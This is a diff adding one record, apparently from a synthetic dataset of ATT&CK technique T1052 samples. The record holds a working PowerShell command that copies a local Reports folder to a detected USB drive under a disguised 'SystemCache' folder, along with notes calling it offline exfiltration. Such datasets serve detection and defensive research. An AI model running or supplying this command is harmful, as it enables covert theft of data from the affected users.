@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=((Get-Disk | Where-Object BusType -eq 'USB' | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1).DriveLetter + ':'); New-Item -Path \"$dl\\SystemCache\" -ItemType Directory -Force | Out-Null; Copy-Item -Path \"C:\\Users\\Public\\Documents\\Reports\" -Destination \"$dl\\SystemCache\" -Recurse -Force",
+  "explanation": "Copies a local documents directory to a detected USB drive under a system-sounding folder, writing data to removable media for offline exfiltration.",
+  "rationale_steps": [
+    "Identify a USB disk and resolve its drive letter.",
+    "Create a hidden-looking destination folder on the USB.",
+    "Recursively copy files from the local system to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-12bcaa5a",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
